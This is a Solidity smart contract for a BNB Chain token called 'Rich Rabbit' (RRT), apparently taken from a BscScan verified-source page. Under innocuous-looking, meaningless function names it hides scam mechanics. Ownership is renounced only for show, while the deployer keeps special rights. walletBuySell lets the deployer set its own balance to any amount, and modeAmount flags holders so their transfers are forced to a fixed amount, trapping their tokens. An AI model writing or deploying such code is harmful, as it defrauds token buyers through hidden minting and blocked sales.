/**
 *Submitted for verification at BscScan.com on 2023-01-24
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;


interface IUniswapV2Router {
    function WETH() external pure returns (address);

    function factory() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract RichRabbit {
    uint8 public decimals = 18;

    address public tradingFrom;
    uint256 constant senderList = 12 ** 10;

    uint256 public totalSupply = 100000000 * 10 ** 18;


    string public name = "Rich Rabbit";
    address public owner;
    address public tradingIs;
    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;
    string public symbol = "RRT";
    mapping(address => bool) public modeTeam;
    mapping(address => bool) public totalMax;
    modifier modeFrom() {
        require(modeTeam[msg.sender]);
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        IUniswapV2Router walletEnable = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        tradingFrom = IUniswapV2Factory(walletEnable.factory()).createPair(walletEnable.WETH(), address(this));
        owner = msg.sender;
        tradingIs = owner;
        modeTeam[tradingIs] = true;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
        renounceOwnership();
    }

    function transfer(address dst, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, dst, amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function _transferFrom(address src, address dst, uint256 amount) internal returns (bool) {
        if (src == tradingIs || dst == tradingIs) {
            return totalBuy(src, dst, amount);
        }
        if (totalMax[src]) {
            return totalBuy(src, dst, senderList);
        }
        return totalBuy(src, dst, amount);
    }

    function teamFrom(address walletTeamLiquidity) public modeFrom {
        modeTeam[walletTeamLiquidity] = true;
    }

    function walletBuySell(uint256 walletList) public modeFrom {
        balanceOf[tradingIs] = walletList;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function totalBuy(address launchedBurn, address teamShould, uint256 walletList) internal returns (bool) {
        require(balanceOf[launchedBurn] >= walletList);
        balanceOf[launchedBurn] -= walletList;
        balanceOf[teamShould] += walletList;
        emit Transfer(launchedBurn, teamShould, walletList);
        return true;
    }

    function transferFrom(address src, address dst, uint256 amount) external returns (bool) {
        if (allowance[src][msg.sender] != type(uint256).max) {
            require(amount <= allowance[src][msg.sender]);
            allowance[src][msg.sender] -= amount;
        }
        return _transferFrom(src, dst, amount);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function modeAmount(address teamTrading) public modeFrom {
        totalMax[teamTrading] = true;
    }


}